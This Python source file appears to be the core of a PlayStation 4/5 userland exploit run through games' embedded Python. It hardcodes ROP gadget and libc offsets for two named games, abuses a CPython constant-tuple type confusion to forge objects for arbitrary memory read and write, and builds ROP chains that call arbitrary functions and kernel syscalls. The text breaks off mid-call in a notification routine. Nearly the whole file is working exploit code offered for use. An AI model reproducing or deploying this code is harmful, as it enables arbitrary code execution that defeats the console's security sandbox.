import struct
import os
from types import CodeType, FunctionType
import traceback

"""
What it does:

1. leaks addresses of important functions / gadgets
2. builds a call primitive that can call any function with up to 6 args
3. provides basic read/write primitives

"""

#########
## PS4 ##
#########

# CHANGE ME
GADGET_OFFSETS = {
    "A YEAR OF SPRINGS": {
        "PS4": {
            # exec
            "add rsp, 0x1b8; ret": 0xE7DC1,
            "pop rax; ret": 0xC710E,
            "pop rcx; ret": 0x1151A3,
            "pop rdx; ret": 0x20B6FB,
            "pop rsi; ret": 0x9884B,
            "pop rdi; ret": 0xE2B93,
            "pop r8; ret": 0xC710D,
            "pop r9; ret": 0x68A7DF,
            "mov [rsi], rax; ret": 0x795C0A,
            "mov rsp, rbp; pop rbp; ret": 0x56AA,
            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
            "add [r8 - 0x7d], rcx; ret": 0x752685,
            "ret": 0x42,
            "mov [rcx], rdx; ret": 0x7E9780,
            # libc
            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
            "mov rax, [rax]; ret": 0xB0057,
        }
    },
    "Arcade Spirits: The New Challengers": {
        "PS4": {
            # exec
            "add rsp, 0x1b8; ret": 0x856DF1,
            "pop rax; ret": 0xA60CD,
            "pop rcx; ret": 0xE6E03,
            "pop rdx; ret": 0x9C762,
            "pop rsi; ret": 0x153B1B,
            "pop rdi; ret": 0x57456,
            "pop r8; ret": 0x25BADF,
            "pop r9; ret": 0x6654CF,
            "mov [rsi], rax; ret": 0x7D528A,
            "mov rsp, rbp; pop rbp; ret": 0xC4,
            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x2D6410,
            "add [r8 - 0x7d], rcx; ret": 0x72087E,
            "ret": 0x42,
            "mov [rcx], rdx; ret": 0x33A3DE,
            # libc
            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
            "mov rax, [rax]; ret": 0xB0057,
        },
        "PS5": {
            # exec
            "add rsp, 0x1b8; ret": 0x87B4C6 - 0x3990,
            "pop rax; ret": 0x6052C - 0x3990,
            "pop rcx; ret": 0x7B88B - 0x3990,
            "pop rdx; ret": 0x2BFF32 - 0x3990,
            "pop rsi; ret": 0x87F82 - 0x3990,
            "pop rdi; ret": 0x3000FD - 0x3990,
            "pop r8; ret": 0x808111 - 0x3990,
            "pop r9; ret 0xc25a": 0xA634E7 - 0x3990,
            "mov [rsi], rax; ret": 0x80205A - 0x3990,
            "mov rsp, rbp; pop rbp; ret": 0x4114 - 0x3990,
            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x38FC50
            - 0x3990,
            "add [r8 - 0x7d], rcx; ret": 0x7A7735 - 0x3990,
            "ret": 0x4032 - 0x3990,
            "mov [rcx], rdx; ret": 0x8AF2C0 - 0x3990,
            # libc
            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x3EB7E,
            "mov rax, [rax]; ret": 0x700D7,
        },
    },
}

LIBC_GADGETS = [
    "mov rsp, [rdi + 0x38]; pop rdi; ret",
    "mov rax, [rax]; ret",
]

LIBC_OFFSETS = {
    "A YEAR OF SPRINGS": {
        "PS4": {
            "sceKernelGetModuleInfoFromAddr": 0x113908,
            "gettimeofday": 0x1139A0,
            "strcmp": 0xB0AE0,
            "__error": 0x168,
            "strerror": 0x37000,
        }
    },
    "Arcade Spirits: The New Challengers": {
        "PS4": {
            "sceKernelGetModuleInfoFromAddr": 0x113908,
            "gettimeofday": 0x1139A0,
            "strcmp": 0xB0AE0,
            "__error": 0x168,
            "strerror": 0x37000,
        },
        "PS5": {
            "sceKernelGetModuleInfoFromAddr": 0x14A9E8,
            "gettimeofday": 0x14A8F8,
            "strcmp": 0x392B0,
            "__error": 0xCC5A0,
            "strerror": 0x73520,
        },
    },
}

EXEC_OFFSETS = {
    "A YEAR OF SPRINGS": {
        "PS4": {
            "func_repr": 0x3B6D70,
            "strcmp": 0xC5F608,
        }
    },
    "Arcade Spirits: The New Challengers": {
        "PS4": {
            "func_repr": 0x353CA0,
            "strcmp": 0xC61F28,
        },
        "PS5": {
            "func_repr": 0x4015C0,
            "strcmp": 0xCFFEB0,
        },
    },
}

PORT = 9025
# END CHANGE ME

CONSOLE_KIND = os.getenv("CONSOLE_KIND", None)
if CONSOLE_KIND is None:
    raise Exception("Cannot determine console kind")

SELECTED_GADGETS = GADGET_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})
SELECTED_LIBC = LIBC_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})
SELECTED_EXEC = EXEC_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})

STAGE2_MAX_SIZE = 4 * 1024 * 1024  # 4MB
STAGE2_BUF = bytes(b"\0" * STAGE2_MAX_SIZE)

SYSCALL = {
    "read": 3,
    "write": 4,
    "open": 5,
    "close": 6,
    "accept": 30,
    "pipe": 42,
    "socket": 97,
    "bind": 104,
    "setsockopt": 105,
    "listen": 106,
    "getsockname": 118,
    "netgetiflist": 125,
    "sysctl": 202,
}

O_WRONLY = 1

AF_INET = 2
SOCK_STREAM = 1
SOL_SOCKET = 0xFFFF
SO_REUSEADDR = 4


class SocketError(Exception):
    pass


############
## COMMON ##
############

nogc = []  # things we want to keep a reference to, to prevent gc


# Thanks @chilaxan
def sizeof(obj):
    return type(obj).__sizeof__(obj)


IS_PY2 = not 2 / 3
BYTES_HEADER_LEN = sizeof(b"") - 1
TUPLE_HEADER_LEN = sizeof(())

INT64_MAX = (1 << 63) - 1
INT32_MAX = (1 << 31) - 1
INT32_MIN = -(1 << 31)
POINTER_SIZE = 8


if IS_PY2:

    def bytes(arr):
        if type(arr) is int:
            return "\0" * arr

        return str(bytearray(arr))


def flat(*args):
    return [x for a in args for x in a]


def p64(n):
    return [(a >> i) & 0xFF for a in n for i in range(0, 64, 8)]


def p64a(*n):
    return p64(n)


def p32(n):
    return [(a >> i) & 0xFF for a in n for i in range(0, 32, 8)]


def p32a(*n):
    return p32(n)


def p16(n):
    return [(a >> i) & 0xFF for a in n for i in range(0, 16, 8)]


def p16a(*n):
    return p16(n)


# technically this can unpack an int of any size
# py2-compatible equivalent of int.from_bytes(n, "little")
def u64(buf):
    n = 0
    for c in reversed(buf):
        n <<= 8
        n += c
    return n


def u64_to_i64(n):
    n = n & 0xFFFFFFFFFFFFFFFF
    if n >= (1 << 63):
        n -= 1 << 64
    return n


def u32_to_i32(n):
    n = n & 0xFFFFFFFF
    if n >= (1 << 31):
        n -= 1 << 32
    return n


def addrof(obj):
    return id(obj)


def unpack(buf):
    return sum(buf[i] << (i * 8) for i in range(len(buf)))


def get_cstring(data, addr=0):
    name = []
    name_addr = addr
    while True:
        c = data[name_addr]
        if c == 0 or c == b"\0":
            break
        name.append(c)
        name_addr += 1
    name = bytes(name)
    return name


def refbytes(data):
    # get the address of the internal buffer of a bytes object
    nogc.append(data)
    return addrof(data) + BYTES_HEADER_LEN


def to_hex(data):
    return str(data).encode("hex")


def alloc(size):
    ba = bytearray(size)
    nogc.append(ba)
    return ba


def get_ref_addr(obj):
    if isinstance(obj, bytearray):
        return refbytearray(obj)
    elif isinstance(obj, str):
        return refbytes(obj)
    elif isinstance(obj, unicode):
        utf8data = obj.encode("utf-8") + b"\0"
        return refbytes(utf8data)
    elif isinstance(obj, StructureInstance):
        return refbytearray(obj.buf)
    elif isinstance(obj, int):
        return obj
    else:
        raise Exception("Unsupported object type for get_ref_addr")


###############
## UNSAFE PY ##
###############


mem = None  # cache the result
reusable_tuple = (None,)
reusable_bytearray = None


def readbuf(addr, length):
    return mem[addr - 0x1000 : addr - 0x1000 + length]


def readuint(addr, size):
    return unpack(readbuf(addr, size))


def refbytearray(data):
    # NOTE: take care your object doesn't get GC'd and leave a dangling reference!
    assert isinstance(data, bytearray)
    addr = addrof(data)
    a = readuint(addr + 8 * 5, 8)  # read the pointer to the underlying buffer
    return a


def get_aligned_tuple_and_bytes(prefix):
    its_per_size = 4
    tuples = []
    byteses = []  # the plural of bytes is byteses, obviously
    for size in range(8, 64)[::-1]:
        tupletemplate = range(size)
        suffix = b"\0" * (size * POINTER_SIZE - len(prefix))
        for _ in range(its_per_size):
            tuples.append(tuple(tupletemplate))
            byteses.append(prefix + suffix)

    bestdist = 99999999999
    besttuple = None
    bestbytes = None
    pairs = [(t, b) for t in tuples for b in byteses]
    for t, b in pairs:
        dist = addrof(b) - addrof(t)
        if dist > 0 and dist < bestdist:
            bestdist = dist
            besttuple = t
            bestbytes = b

    if bestdist > 100000:
        raise Exception(
            "Heap groom failed: Could not allocate bytes near enough to tuple",
            hex(bestdist),
        )

    return (besttuple, bestbytes)


# generate a function that effectively does LOAD_CONST(n)
def load_n(n):
    return eval(
        "lambda: list(%s) if None else %s" % (",".join(map(str, range(1, n))), n)
    )


def replace_code_consts(codeobj, consts):
    # py3.8+
    if hasattr(codeobj, "replace"):
        return codeobj.replace(co_consts=consts)

    code_args = []
    argnames = CodeType.__doc__.split("(")[1].split("[")[0].split(",")
    for argname in argnames:
        argname = argname.strip()

        if argname == "codestring":
            argname = "code"

        if argname == "constants":
            code_args.append(consts)
        else:
            code_args.append(getattr(codeobj, "co_" + argname))

    return CodeType(*code_args)


def fakeobj_once(addr):
    fake_bytearray_ptr = bytes(p64a(addr))

    # pad to 8-byte multiple
    fake_bytearray_ptr = b"\0\0\0\0" + fake_bytearray_ptr

    nogc.append(
        fake_bytearray_ptr
    )  # if this bytearray gets freed, bad things might happen

    const_tuple, fake_bytearray_ref = get_aligned_tuple_and_bytes(fake_bytearray_ptr)

    nogc.append(fake_bytearray_ref)  # likewise

    const_tuple_array_start = addrof(const_tuple) + TUPLE_HEADER_LEN
    fake_bytearray_ref_addr = refbytes(fake_bytearray_ref)

    fake_bytearray_ref_addr += 4
    offset = (fake_bytearray_ref_addr - const_tuple_array_start) // POINTER_SIZE

    assert INT32_MIN <= offset <= INT32_MAX

    loader_code = load_n(offset).__code__
    newcode = replace_code_consts(loader_code, const_tuple)

    makemagic = FunctionType(newcode, {})

    magic = makemagic()
    return magic


def fakeobj(addr):
    """
    fakeobj_once() does a heap spray each time, which may fail probabilistically and/or OOM.
    so, we use it once to set up a more repeatable fakeobj primitive which we can
    cache and reuse for future fakeobj() invocations.

    reusable_bytearray is a fake bytearray that points into the first entry of
    reusable_tuple, allowing us to freely modify the object it points to.
    """

    global reusable_bytearray
    if reusable_bytearray is None:
        # py3: https://github.com/python/cpython/blob/75c551974f74f7656fbb479b278e69c8200b4603/Include/cpython/bytearrayobject.h#L5-L12
        """
        typedef struct _object PyObject;

        # real definition has lots of #ifdefs, but it's basically this
        struct _object {
            Py_ssize_t ob_refcnt;
            PyTypeObject *ob_type;
        }

        #define PyObject_VAR_HEAD      PyVarObject ob_base;

        typedef struct {
            PyObject ob_base;
            Py_ssize_t ob_size; /* Number of items in variable part */
        } PyVarObject;

        typedef struct {
            PyObject_VAR_HEAD
            Py_ssize_t ob_alloc;   /* How many bytes allocated in ob_bytes */
            char *ob_bytes;        /* Physical backing buffer */
            char *ob_start;        /* Logical start inside ob_bytes */
            Py_ssize_t ob_exports; /* How many buffer exports */
        } PyByteArrayObject;
        """
        # py2: https://github.com/certik/python-2.7/blob/c360290c3c9e55fbd79d6ceacdfc7cd4f393c1eb/Include/bytearrayobject.h#L22-L28
        """
        typedef struct {
            PyObject_VAR_HEAD
            /* XXX(nnorwitz): should ob_exports be Py_ssize_t? */
            int ob_exports; /* how many buffer exports */
            Py_ssize_t ob_alloc; /* How many bytes allocated */
            char *ob_bytes;
        } PyByteArrayObject;
        """
        fake_bytearray = bytes(
            p64a(
                1,  # ob_refcnt
                addrof(bytearray),  # ob_type
                8,  #    ob_size
                0,  #    py2 ob_exports, py3 ob_alloc
                8 + 1,  #    py2 ob_alloc, py3 ob_bytes
                addrof(reusable_tuple) + TUPLE_HEADER_LEN,  # py2 ob_bytes, py3 ob_start
                0,  # py3 ob_exports
            )
        )
        nogc.append(fake_bytearray)  # important!!!
        reusable_bytearray = fakeobj_once(refbytes(fake_bytearray))

    # assume 64-bit ptrs
    backup = reusable_bytearray[:8]
    reusable_bytearray[:8] = p64a(addr)
    res = reusable_tuple[0]
    reusable_bytearray[:8] = backup

    nogc.append(res)  # unnecessary?
    return res


def getmem():
    global mem
    if mem:
        return mem

    fake_bytearray = bytes(
        p64a(1, addrof(bytearray), INT64_MAX - 0x1000, 0, 0, 0x1000, 0)
    )
    nogc.append(fake_bytearray)

    mem = fakeobj(refbytes(fake_bytearray))
    return mem


def convert_regs_to_int(*regs):
    int_regs = []
    for r in regs:
        if isinstance(r, (bytearray, str, unicode)):
            int_regs.append(get_ref_addr(r))
        else:
            int_regs.append(r)
    return int_regs


class ROPChain(object):
    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
        self.sc = sc
        self.chain = bytearray(size)
        self.return_value_buf = alloc(8)
        self.return_value_addr = get_ref_addr(self.return_value_buf)
        self.errno_buf = alloc(4)
        self.errno_addr = get_ref_addr(self.errno_buf)
        self.index = 0

    @property
    def return_value(self):
        return struct.unpack("<Q", self.return_value_buf[0:8])[0]

    @property
    def errno(self):
        return struct.unpack("<I", self.errno_buf[0:4])[0]

    @property
    def addr(self):
        return get_ref_addr(self.chain)

    def reset(self):
        self.index = 0
        self.chain[:] = b"\0" * len(self.chain)

    def append(self, value):
        if self.index + 8 > len(self.chain):
            raise Exception("ROP chain overflow")
        self.chain[self.index : self.index + 8] = struct.pack("<Q", value)
        self.index += 8

    def extend(self, buf):
        if self.index + len(buf) > len(self.chain):
            raise Exception("ROP chain overflow")
        self.chain[self.index : self.index + len(buf)] = buf
        self.index += len(buf)

    def push_gadget(self, gadget_name):
        if gadget_name not in self.sc.gadgets:
            raise Exception("Gadget %s not found" % gadget_name)

        self.append(
            (
                self.sc.exec_addr
                if gadget_name not in LIBC_GADGETS
                else self.sc.libc_addr
            )
            + self.sc.gadgets[gadget_name]
        )

    def push_value(self, value):
        self.append(value)

    def push_syscall(self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)

        self.push_gadget("pop rax; ret")
        self.push_value(syscall_number)
        self.push_gadget("pop rdi; ret")
        self.push_value(rdi)
        self.push_gadget("pop rsi; ret")
        self.push_value(rsi)
        self.push_gadget("pop rdx; ret")
        self.push_value(rdx)
        self.push_gadget("pop rcx; ret")
        self.push_value(rcx)
        self.push_gadget("pop r8; ret")
        self.push_value(r8)
        if CONSOLE_KIND == "PS4":
            self.push_gadget("pop r9; ret")
            self.push_value(r9)
        else:
            self.push_gadget("pop r9; ret 0xc25a")
            self.push_value(r9)
            self.extend(b"\0" * 0xC25A)  # align the stack
        if self.sc.platform == "ps5":
            self.push_value(self.sc.syscall_addr)
        else:
            self.push_value(self.sc.syscall_table[syscall_number])

    def push_call(self, addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        (rdi, rsi, rdx, rcx, r8, r9) = convert_regs_to_int(rdi, rsi, rdx, rcx, r8, r9)

        self.push_gadget("pop rdi; ret")
        self.push_value(rdi)
        self.push_gadget("pop rsi; ret")
        self.push_value(rsi)
        self.push_gadget("pop rdx; ret")
        self.push_value(rdx)
        self.push_gadget("pop rcx; ret")
        self.push_value(rcx)
        self.push_gadget("pop r8; ret")
        self.push_value(r8)
        if CONSOLE_KIND == "PS4":
            self.push_gadget("pop r9; ret")
            self.push_value(r9)
        else:
            self.push_gadget("pop r9; ret 0xc25a")
            self.push_value(r9)
            self.extend(b"\0" * 0xC25A)  # align the stack
        self.push_value(addr)

    def push_get_return_value(self):
        self.push_gadget("pop rsi; ret")
        self.push_value(self.return_value_addr)
        self.push_gadget("mov [rsi], rax; ret")

    def push_get_errno(self):
        self.push_call(self.sc.libc_addr + SELECTED_LIBC["__error"])
        self.push_gadget("pop rsi; ret")
        self.push_value(self.errno_addr)
        self.push_gadget("mov rax, [rax]; ret")
        self.push_gadget("mov [rsi], rax; ret")

    def push_write_into_memory(self, addr, value):
        self.push_gadget("pop rsi; ret")
        self.push_value(addr)
        self.push_gadget("pop rax; ret")
        self.push_value(value)
        self.push_gadget("mov [rsi], rax; ret")

    def push_store_rax_into_memory(self, addr):
        self.push_gadget("pop rsi; ret")
        self.push_value(addr)
        self.push_gadget("mov [rsi], rax; ret")

    def push_store_rdx_into_memory(self, addr):
        self.push_gadget("pop rcx; ret")
        self.push_value(addr)
        self.push_gadget("mov [rcx], rdx; ret")


class Executable(object):
    def __init__(self, sc, size=0x2000 if CONSOLE_KIND == "PS4" else 0xF000):
        self.sc = sc
        self.chain = ROPChain(sc, size)

        CONTEXT_SZ = 0x210

        # allocate the objects we need, so they can be used/reused by call()
        self.call_contextbuf = bytearray(CONTEXT_SZ)
        self.call_contextbuf[0x38:0x40] = p64a(self.chain.addr)
        self.call_contextbuf[0x130:0x138] = p64a(
            self.sc.libc_addr + self.sc.gadgets["mov rsp, [rdi + 0x38]; pop rdi; ret"]
        )

        # make a copy of the built-in function type object
        self.call_functype = readbuf(addrof(FunctionType), sizeof(FunctionType))

        self.call_functype[16 * 8 : 16 * 8 + 8] = p64a(
            self.sc.exec_addr
            + self.sc.gadgets[
                "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]"
            ]
        )

        # note: user must patch tp_call before use e.g.
        # call_functype[16*8:16*8 + 8] = p64a(0xdeadbeef)

        # get a pointer to our patched function type
        self.call_functype_ptr = refbytearray(self.call_functype)

        # note: user must set _call_contextbuf type object before each use.
        # (also need to set it here otherwise the gc will explode when it looks at my_func_ptr)
        self.call_contextbuf[8:16] = p64a(self.call_functype_ptr)

        self.my_func_ptr = refbytearray(self.call_contextbuf)
        # print("my_func_ptr", hex(my_func_ptr))
        self.call_func = fakeobj(self.my_func_ptr)

    @property
    def errno(self):
        return self.chain.errno

    def setup_front_chain(self):
        self.chain.push_value(0)

        # add bunch of padding to align the stack
        for _ in range(16):
            self.chain.push_gadget("add rsp, 0x1b8; ret")
            for _ in range(55):
                self.chain.push_value(0)

    def setup_call_chain(self, func_addr, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        self.chain.push_call(
            func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_syscall_chain(
        self, syscall_number, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0
    ):
        self.chain.push_syscall(
            syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )

        # padding to align the stack
        self.chain.push_gadget("add rsp, 0x1b8; ret")
        for _ in range(55):
            self.chain.push_value(0)

    def setup_post_chain(self):
        self.chain.push_get_return_value()
        self.chain.push_get_errno()

    def setup_back_chain(self):
        self.chain.push_gadget("pop r8; ret")
        self.chain.push_value(addrof(None) + 0x7D)
        self.chain.push_gadget("pop rcx; ret")
        self.chain.push_value(1)
        self.chain.push_gadget("add [r8 - 0x7d], rcx; ret")
        self.chain.push_gadget("pop rax; ret")
        self.chain.push_value(addrof(None))
        self.chain.push_gadget("mov rsp, rbp; pop rbp; ret")

    def execute(self):
        self.call_func(*tuple(), **dict())
        return self.chain.return_value

    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        pass


class Function(Executable):
    def __init__(self, sc, func_addr):
        super(Function, self).__init__(sc)
        self.func_addr = func_addr

    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        self.chain.reset()
        self.setup_front_chain()
        self.setup_call_chain(
            self.func_addr, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )
        self.setup_post_chain()
        self.setup_back_chain()
        return self.execute()


class Syscall(Executable):
    def __init__(self, sc, syscall_number):
        super(Syscall, self).__init__(sc)
        self.syscall_number = syscall_number
        if self.sc.platform == "ps4" and syscall_number not in self.sc.syscall_table:
            raise Exception("Syscall number %d not found" % syscall_number)

    def __call__(self, rdi=0, rsi=0, rdx=0, rcx=0, r8=0, r9=0):
        pipe_on_ps5 = (
            self.syscall_number == SYSCALL["pipe"] and self.sc.platform == "ps5"
        )
        if pipe_on_ps5:
            rax_buf = alloc(8)
            rdx_buf = alloc(8)

        self.chain.reset()
        self.setup_front_chain()
        self.setup_syscall_chain(
            self.syscall_number, rdi=rdi, rsi=rsi, rdx=rdx, rcx=rcx, r8=r8, r9=r9
        )
        self.setup_post_chain()

        if pipe_on_ps5:
            self.chain.push_gadget("pop rsi; ret")
            self.chain.push_value(refbytearray(rax_buf))
            self.chain.push_gadget("mov [rsi], rax; ret")
            self.chain.push_gadget("pop rcx; ret")
            self.chain.push_value(refbytearray(rdx_buf))
            self.chain.push_gadget("mov [rcx], rdx; ret")

        self.setup_back_chain()
        ret = self.execute()

        if pipe_on_ps5:
            self.sc.mem[rdi - 0x1000 : rdi - 0x1000 + 4] = rax_buf[0:4]
            self.sc.mem[rdi - 0x1000 + 4 : rdi - 0x1000 + 8] = rdx_buf[0:4]

        return ret

    def get_error_string(self):
        errstr_addr = self.sc.functions.strerror(self.errno)
        errstr = get_cstring(self.sc.mem, errstr_addr)
        return errstr


class FunctionContainer(object):
    def __init__(self, sc):
        self.sc = sc
        self.functions = {}

    def __setattr__(self, name, value):
        if name in ("sc", "functions"):
            object.__setattr__(self, name, value)
        else:
            self.functions[name] = value

    def __getattr__(self, name):
        func_name = name
        if func_name not in self.functions:
            if func_name in SELECTED_LIBC:
                func_addr = self.sc.libc_addr + SELECTED_LIBC[func_name]
            elif func_name in SELECTED_EXEC:
                func_addr = self.sc.exec_addr + SELECTED_EXEC[func_name]
            else:
                raise Exception("Function %s not found" % func_name)
            func = Function(self.sc, func_addr)
            self.functions[func_name] = func
        return self.functions[func_name]


class SyscallContainer(object):
    def __init__(self, sc):
        self.sc = sc
        self.syscalls = {}

    def __setattr__(self, name, value):
        if name in ("sc", "syscalls"):
            object.__setattr__(self, name, value)
        else:
            self.syscalls[name] = value

    def __getattr__(self, name):
        syscall_name = name
        if syscall_name not in self.syscalls:
            if syscall_name not in SYSCALL:
                raise Exception("Syscall %s not found" % syscall_name)
            syscall_number = SYSCALL[syscall_name]
            syscall = Syscall(self.sc, syscall_number)
            self.syscalls[syscall_name] = syscall
        return self.syscalls[syscall_name]


class Structure(object):
    def __init__(self, sizes):
        self.sizes = sizes
        self.calculate()

    def calculate(self):
        self.size = 0
        self.offsets = {}
        for field_name, field_size in self.sizes.items():
            self.offsets[field_name] = self.size
            self.size += field_size

    def create(self, defaults=None):
        buf = StructureInstance(self, defaults)
        return buf

    def from_bytes(self, data):
        if len(data) != self.size:
            raise Exception("Data size does not match structure size")
        instance = StructureInstance(self)
        instance.buf[:] = data
        return instance

    def from_bytearray(self, data):
        if len(data) != self.size:
            raise Exception("Data size does not match structure size")
        instance = StructureInstance(self)
        instance.buf = data
        return instance

    def from_address(self, addr):
        fake_bytearray = bytes(p64a(1, addrof(bytearray), self.size, 0, 0, addr, 0))
        nogc.append(fake_bytearray)

        data = fakeobj(refbytes(fake_bytearray))
        return self.from_bytearray(data)


class StructureInstance(object):
    def __init__(self, structure, defaults=None):
        self.structure = structure
        self.buf = alloc(self.structure.size)
        if defaults:
            for key, value in defaults.items():
                self.set_field(key, value)

    @property
    def addr(self):
        return get_ref_addr(self.buf)

    def reset(self):
        self.buf[:] = b"\0" * len(self.buf)

    def set_field_raw(self, field_name, data):
        offset = self.structure.offsets[field_name]
        field_size = self.structure.sizes[field_name]
        self.buf[offset : offset + field_size] = data

    def set_field(self, field_name, value):
        offset = self.structure.offsets[field_name]
        field_size = self.structure.sizes[field_name]
        if field_size in [1, 2, 4, 8]:
            converted_val = get_ref_addr(value)
            if field_size == 1:
                value = struct.pack("<B", converted_val)
            elif field_size == 2:
                value = struct.pack("<H", converted_val)
            elif field_size == 4:
                value = struct.pack("<I", converted_val)
            elif field_size == 8:
                value = struct.pack("<Q", converted_val)

            self.buf[offset : offset + field_size] = value
        else:
            self.set_field_raw(field_name, value)

    def get_field_raw(self, field_name):
        offset = self.structure.offsets[field_name]
        size = self.structure.sizes[field_name]
        return self.buf[offset : offset + size]

    def get_field(self, field_name):
        offset = self.structure.offsets[field_name]
        size = self.structure.sizes[field_name]
        data = self.buf[offset : offset + size]
        if size in [1, 2, 4, 8]:
            if size == 1:
                return struct.unpack("<B", data)[0]
            elif size == 2:
                return struct.unpack("<H", data)[0]
            elif size == 4:
                return struct.unpack("<I", data)[0]
            elif size == 8:
                return struct.unpack("<Q", data)[0]
        else:
            return data

    def __setitem__(self, key, value):
        if key in self.structure.offsets:
            self.set_field(key, value)
        else:
            raise KeyError("No such field: %s" % key)

    def __getitem__(self, key):
        if key in self.structure.offsets:
            return self.get_field(key)
        else:
            raise KeyError("No such field: %s" % key)

    def __setattr__(self, name, value):
        if name in ("structure", "buf"):
            object.__setattr__(self, name, value)
        elif name in self.structure.offsets:
            self.set_field(name, value)
        else:
            raise AttributeError("No such field: %s" % name)

    def __getattr__(self, name):
        if name in ("structure", "buf"):
            return object.__getattribute__(self, name)
        elif name in self.structure.offsets:
            return self.get_field(name)
        else:
            raise AttributeError("No such field: %s" % name)


class SploitCore(object):
    def __init__(self):
        self.mem = getmem()

        print("[*] Obtained memory object")

        func_type_addr = addrof(FunctionType)
        print("[*] FunctionType address: 0x%x" % func_type_addr)
        func_repr_addr = readuint(func_type_addr + 11 * 8, 8)
        print("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)

        self.exec_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
        print("[*] Executable base address: 0x%x" % self.exec_addr)

        self.libc_addr = (
            readuint(self.exec_addr + SELECTED_EXEC["strcmp"], 8)
            - SELECTED_LIBC["strcmp"]
        )
        print("[*] libc base address: 0x%x" % self.libc_addr)

        # Use hardcoded gadgets
        self.gadgets = SELECTED_GADGETS

        self.functions = FunctionContainer(self)
        self.syscalls = SyscallContainer(self)

        self.platform = None
        self.version = None
        self._prepare_syscall()

    def _prepare_syscall(self):
        INIT_PROC_ADDR_OFFSET = 0x128
        SEGMENTS_OFFSET = 0x160

        gettimeofday_in_libkernel = readuint(
            self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
        )
        print("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)

        # eh why not
        self.make_function_if_needed("gettimeofday", gettimeofday_in_libkernel)

        mod_info = bytes([b"\0"] * 0x300)
        nogc.append(mod_info)

        sceKernelGetModuleInfoFromAddr_addr = readuint(
            self.libc_addr + SELECTED_LIBC["sceKernelGetModuleInfoFromAddr"], 8
        )
        ret = self.make_function_if_needed(
            "sceKernelGetModuleInfoFromAddr", sceKernelGetModuleInfoFromAddr_addr
        )(
            gettimeofday_in_libkernel,
            1,
            mod_info,
        )

        if ret != 0:
            raise Exception("sceKernelGetModuleInfoFromAddr failed: 0x%x" % ret)

        self.libkernel_addr = struct.unpack(
            "<Q", mod_info[SEGMENTS_OFFSET : SEGMENTS_OFFSET + 8]
        )[0]
        print("[*] libkernel base address: 0x%x" % self.libkernel_addr)
        init_proc_addr = struct.unpack(
            "<Q", mod_info[INIT_PROC_ADDR_OFFSET : INIT_PROC_ADDR_OFFSET + 8]
        )[0]
        delta = self.libkernel_addr - init_proc_addr

        if delta == 0:
            self.platform = "ps4"
            libkernel_buf = readbuf(self.libkernel_addr, 0x40000)
            pattern = (
                0x48,
                0xC7,
                0xC0,
                None,
                None,
                None,
                None,
                0x49,
                0x89,
                0xCA,
                0x0F,
                0x05,
            )
            self.syscall_table = {}
            limit = len(libkernel_buf) - len(pattern) + 1
            for idx in range(limit):
                for off, val in enumerate(pattern):
                    if val is not None and libkernel_buf[idx + off] != val:
                        break
                else:
                    syscall_number = struct.unpack(
                        "<I", libkernel_buf[idx + 3 : idx + 7]
                    )[0]
                    syscall_gadget_addr = self.libkernel_addr + idx
                    self.syscall_table[syscall_number] = syscall_gadget_addr
            if not self.syscall_table:
                raise Exception("syscall gadget pattern not found")
            print("[*] syscall gadget table built")
        elif delta == 0x10:
            self.platform = "ps5"
            self.syscall_addr = (
                gettimeofday_in_libkernel + 0x7
            )  # to skip `mov rax, <num>`
            print("[*] syscall gadget address: 0x%x" % self.syscall_addr)
        else:
            raise Exception("Unknown platform (delta: 0x%x)" % delta)

        buf = alloc(8)
        size = alloc(8)
        size[0:8] = struct.pack("<Q", 8)
        if self.sysctl("kern.sdk_version", buf, size):
            lower, upper = struct.unpack("<BB", buf[2:4])
            self.version = "%x.%02x" % (upper, lower)
            print("[*] Detected OS version: %s" % self.version)
        else:
            print("[*] Could not detect OS version")

    def make_function_if_needed(self, name, func_addr):
        if name not in self.functions.functions:
            self.functions.functions[name] = Function(self, func_addr)
        return self.functions.functions[name]

    def make_syscall_if_needed(self, name, syscall_number):
        if name not in self.syscalls.syscalls:
            self.syscalls.syscalls[name] = Syscall(self, syscall_number)
        return self.syscalls.syscalls[name]

    def send_notification(self, msg):
        icon_uri = b"cxml://psnotification/tex_icon_system"
        notify_buf = bytearray(0xC30)
        nogc.append(notify_buf)

        notify_buf[0x2C : 0x2C + 4] = bytes(p32a(0x10))  # use_icon_image_url
        notify_buf[0x10 : 0x10 + 4] = bytes(p32a(0xFFFFFFFF))  # target_id

        msg_bytes = msg.encode("utf-8")
        notify_buf[0x2D : 0x2D + len(msg_bytes)] = msg_bytes
        notify_buf[0x42D : 0x42D + len(icon_uri)] = icon_uri

        dev_path = b"/dev/notification0\0"
        nogc.append(dev_path)
        fd = self.syscalls.open(
            refbytes(dev_path),
